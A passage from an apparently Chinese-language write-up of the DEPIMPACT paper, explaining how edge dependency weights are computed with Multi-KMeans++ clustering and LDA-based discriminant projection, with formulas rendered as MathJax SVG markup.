transform="translate(10241,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(10630,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mo" transform="translate(11130,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span> 其中，InDegree(v)和OutDegree(v)表示节点v的入度和出度。</p><h4 id="依赖权重计算-1">4.2.3 依赖权重计算</h4><p>为了从特征计算依赖权重，DEPIMPACT利用了以高的可解释性和低的计算成本而闻名的线性投影。DEPIMPACT不是直接取平均值，而是采用基于线性判别分析(LDA)的判别特征投影方案来计算投影向量，以最大化关键边和非关键边之间的差异，关键边分配有更高的权重。接下来，我们详细介绍该方案。</p><p><strong>第1步：边缘聚类</strong>在第一步中，DEPIMPACT利用聚类将边分为两组：一组可能包含关键边，另一组包含非关键边。具体来说，DEPIMPACT首先将特征归一化到0-1范围，然后采用 Multi-KMeans++聚类算法，该算法在初始种子选择和聚类鲁棒性方面优于标准 KMeans算法。我们选择k=2，因为我们希望按照LDA的要求将边聚类为两组。我们实验了n的一系列值([5,30])，并选择了n=20，因为它在没有太多开销的情况下提供最佳的聚类结果。虽然聚类结果可用于直接区分关键边和非关键边，但这种方法会遇到与全局权重相同的问题，这在第5.2节中被证明是无效的。</p><p><strong>第2步: 判别特征投影</strong>给定两组边，DEPIMPACT利用线性判别分析(LDA)来计算最大化组投影之间间隔的最佳投影向量。LDA找到使同一组中的投影点彼此靠近且不同组中的投影点彼此远离的最佳投影平面。形式上，LDA找到使Fisher准则最大化的投影向量ω，<span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.003ex;" xmlns="http://www.w3.org/2000/svg" width="18.318ex" height="5.437ex" role="img" focusable="false" viewBox="0 -1517.7 8096.7 2403.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z"></path></g><g data-mml-node="mo" transform="translate(633,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1022,0)"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z"></path></g><g data-mml-node="mo" transform="translate(1738,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2404.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(3460.6,0)"><g data-mml-node="mrow" transform="translate(220,676)"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z"></path></g><g data-mml-node="mi" transform="translate(749,363) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g><g data-mml-node="msub" transform="translate(1296.8,0)"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="mi" transform="translate(646,-150) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g><g data-mml-node="mi" transform="translate(2296.2,0)"><path data-c="1D714" d="M495 384Q495 406 514 424T555 443Q574 443 589 425T604 364Q604 334 592 278T555 155T483 38T377 -11Q297 -11 267 66Q266 68 260 61Q201 -11 125 -11Q15 -11 15 139Q15 230 56 325T123 434Q135 441 147 436Q160 429 160 418Q160 406 140 379T94 306T62 208Q61 202 61 187Q61 124 85 100T143 76Q201 76 245 129L253 137V156Q258 297 317 297Q348 297 348 261Q348 243 338 213T318 158L308 135Q309 133 310 129T318 115T334 97T358 83T393 76Q456 76 501 148T546 274Q546 305 533 325T508 357T495 384Z"></path></g></g><g data-mml-node="mrow" transform="translate(220,-727.7)"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z"></path></g><g data-mml-node="mi" transform="translate(749,289) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g><g data-mml-node="msub" transform="translate(1296.8,0)"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="mi" transform="translate(646,-150) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g><g data-mml-node="mi" transform="translate(2296.2,0)"><path data-c="1D714" d="M495 384Q495 406 514 424T555 443Q574 443 589 425T604 364Q604 334 592 278T555 155T483 38T377 -11Q297 -11 267 66Q266 68 260 61Q201 -11 125 -11Q15 -11 15 139Q15 230 56 325T123 434Q135 441 147 436Q160 429 160 418Q160 406 140 379T94 306T62 208Q61 202 61 187Q61 124 85 100T143 76Q201 76 245 129L253 137V156Q258 297 317 297Q348 297 348 261Q348 243 338 213T318 158L308 135Q309 133 310 129T318 115T334 97T358 83T393 76Q456 76 501 148T546 274Q546 305 533 325T508 357T495 384Z"></path></g></g><rect width="3118.2" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(6818.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(7207.7,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mo" transform="translate(7707.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span>其中S<sub>b</sub>和S<sub>w</sub>分别是组间散射矩阵和组内散射矩阵。解决优化问题的结果是:<span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.576ex;" xmlns="http://www.w3.org/2000/svg" width="36.718ex" height="2.576ex" role="img" focusable="false" viewBox="0 -883.9 16229.5 1138.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D714" d="M495 384Q495 406 514 424T555 443Q574 443 589 425T604 364Q604 334 592 278T555 155T483 38T377 -11Q297 -11 267 66Q266 68 260 61Q201 -11 125 -11Q15 -11 15 139Q15 230 56 325T123 434Q135 441 147 436Q160 429 160 418Q160 406 140 379T94 306T62 208Q61 202 61 187Q61 124 85 100T143 76Q201 76 245 129L253 137V156Q258 297 317 297Q348 297 348 261Q348 243 338 213T318 158L308 135Q309 133 310 129T318 115T334 97T358 83T393 76Q456 76 501 148T546 274Q546 305 533 325T508 357T495 384Z"></path></g><g data-mml-node="mo" transform="translate(655,413) scale(0.707)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g></g><g data-mml-node="mo" transform="translate(1336.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2392.1,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(2921.1,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(3372.1,0)"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(3849.1,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(4727.1,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(5256.1,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(5828.1,0)"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z"></path></g><g data-mml-node="mo" transform="translate(6461.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(6850.1,0)"><path data-c="1D714" d="M495 384Q495 406 514 424T555 443Q574 443 589 425T604 364Q604 334 592 278T555 155T483 38T377 -11Q297 -11 267 66Q266 68 260 61Q201 -11 125 -11Q15 -11 15 139Q15 230 56 325T123 434Q135 441 147 436Q160 429 160 418Q160 406 140 379T94 306T62 208Q61 202 61 187Q61 124 85 100T143 76Q201 76 245 129L253 137V156Q258 297 317 297Q348 297 348 261Q348 243 338 213T318 158L308 135Q309 133 310 129T318 115T334 97T358 83T393 76Q456 76 501 148T546 274Q546 305 533 325T508 357T495 384Z"></path></g><g data-mml-node="mo" transform="translate(7472.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(8138.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msubsup" transform="translate(9194.7,0)"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="TeXAtom" transform="translate(729.6,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(778,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mi" transform="translate(646,-247) scale(0.707)"><path data-c="1D714" d="M495 384Q495 406 514 424T555 443Q574 443 589 425T604 364Q604 334 592 278T555 155T483 38T377 -11Q297 -11 267 66Q266 68 260 61Q201 -11 125 -11Q15 -11 15 139Q15 230 56 325T123 434Q135 441 147 436Q160 429 160 418Q160 406 140 379T94 306T62 208Q61 202 61 187Q61 124 85 100T143 76Q201 76 245 129L253 137V156Q258 297 317 297Q348 297 348 261Q348 243 338 213T318 158L308 135Q309 133 310 129T318 115T334 97T358 83T393 76Q456 76 501 148T546 274Q546 305 533 325T508 357T495 384Z"></path></g></g><g data-mml-node="mo" transform="translate(10877.9,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(11266.9,0)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mo"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">µ</text></g></g><g data-mml-node="mn" transform="translate(633,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(12525.7,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msub" transform="translate(13525.9,0)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mo"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">µ</text></g></g><g data-mml-node="mn" transform="translate(633,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(14562.5,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(14951.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(15340.5,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(15840.5,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 